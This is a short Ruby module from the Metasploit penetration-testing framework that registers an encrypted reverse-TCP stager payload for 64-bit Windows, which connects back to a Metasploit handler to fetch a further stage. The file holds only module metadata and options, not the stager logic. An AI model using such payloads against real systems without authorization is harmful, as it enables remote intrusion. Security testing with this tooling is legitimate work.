##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/encrypted_reverse_tcp'

module MetasploitModule

  include Msf::Payload::Stager
  include Msf::Payload::Windows::EncryptedReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Encrypted Reverse TCP Stager',
      'Description' => 'Connect to MSF and read in stage',
      'Author'      => [ 'Shelby Pace' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => false },
      'Dependency'  => Msf::Compilers::Mingw
    ))

    register_advanced_options(
    [
      OptPath.new('LinkerScript', [ false, 'Linker script that orders payload functions', "#{LINK_SCRIPT_PATH}/func_order64.ld" ])
    ])
  end
end
